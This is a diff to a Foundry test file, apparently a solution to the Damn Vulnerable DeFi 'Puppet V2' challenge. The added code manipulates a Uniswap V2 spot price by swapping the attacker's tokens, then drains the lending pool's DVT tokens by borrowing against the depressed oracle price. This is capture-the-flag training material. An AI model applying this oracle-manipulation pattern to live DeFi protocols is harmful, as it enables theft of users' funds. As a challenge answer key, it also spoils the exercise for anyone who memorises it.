@@ -103,7 +103,27 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        address[] memory path = new address[](2);
 
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        uint256 maxAmt = type(uint256).max;
+
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(puppetV2Pool), maxAmt);
+        weth.deposit{value: attacker.balance}();
+
+        uniswapV2Router.swapExactTokensForTokens(dvt.balanceOf(attacker), 1, path, attacker, block.timestamp + 1);
+        uint256 balDvt = dvt.balanceOf(address(puppetV2Pool));
+        uint256 borrowAmt = puppetV2Pool.calculateDepositOfWETHRequired(balDvt);
+        if (weth.balanceOf(attacker) >= borrowAmt) {
+            puppetV2Pool.borrow(balDvt);
+        }
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
